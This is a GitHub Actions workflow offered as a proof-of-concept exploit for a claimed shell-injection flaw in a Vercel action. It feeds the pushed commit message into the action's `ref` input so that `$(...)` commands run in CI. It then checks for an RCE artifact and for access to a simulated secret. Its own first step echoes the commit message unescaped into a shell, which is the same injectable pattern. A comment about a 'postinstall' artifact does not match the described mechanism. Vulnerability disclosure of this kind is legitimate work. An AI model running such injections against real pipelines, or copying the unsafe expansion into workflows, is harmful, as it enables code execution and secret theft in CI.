name: PoC - vercel/repository-dispatch shell injection v2
# Authorized security research demonstration. Reads `inputs.ref` from the
# commit message of the pushed commit -- a documented `${{ github.event.head_commit.message }}`
# pattern. When the published Vercel action expands `${{ inputs.ref }}` directly into a
# bash `run:` block (action.yaml lines 30-36), the commit message's $(...) syntax fires.

on:
  push:
    branches: [poc-action-injection]

jobs:
  poc:
    runs-on: ubuntu-latest
    env:
      SIMULATED_SECRET: 'fake-token-for-poc-evidence-12345abcdef'
    steps:
      - name: Show triggering commit message (what flows into inputs.ref)
        run: |
          echo "github.event.head_commit.message = "
          echo "${{ github.event.head_commit.message }}"

      - name: Invoke vulnerable Vercel action with attacker-controlled ref
        uses: vercel/repository-dispatch/actions/checkout@v1
        with:
          ref: ${{ github.event.head_commit.message }}

      - name: Evidence that injection occurred
        if: always()
        run: |
          echo "--- looking for RCE artifact created by the postinstall... ---"
          ls -la /tmp/RCE_PROOF_* 2>&1 || echo "(no RCE artifact found)"
          echo ""
          echo "--- SIMULATED_SECRET env var length (proves env access during prior step) ---"
          echo "SIMULATED_SECRET length: ${#SIMULATED_SECRET}"
